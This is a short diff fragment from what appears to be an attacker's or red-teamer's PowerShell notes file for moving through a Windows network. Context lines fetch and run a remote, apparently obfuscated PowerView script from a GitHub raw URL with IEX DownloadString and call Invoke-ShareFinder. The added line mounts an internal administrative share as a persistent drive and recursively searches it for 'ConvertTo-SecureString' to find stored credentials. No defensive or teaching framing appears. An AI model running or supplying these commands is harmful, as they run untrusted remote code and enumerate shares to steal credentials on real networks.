@@ -6,6 +6,9 @@ IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubuserconte
 
 IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/creationstation123/X/main/ObfView.txt');Invoke-ShareFinder -ComputerName 
 
+$sharePath = "\\DCN3PINW001\P$"; New-PSDrive -Name "P" -PSProvider FileSystem -Root $sharePath -Persist; Get-ChildItem -Path "P:\" -Recurse | Select-String -Pattern 'ConvertTo-SecureString' | ForEach-Object { $_.Path }
+
+
 
 
 
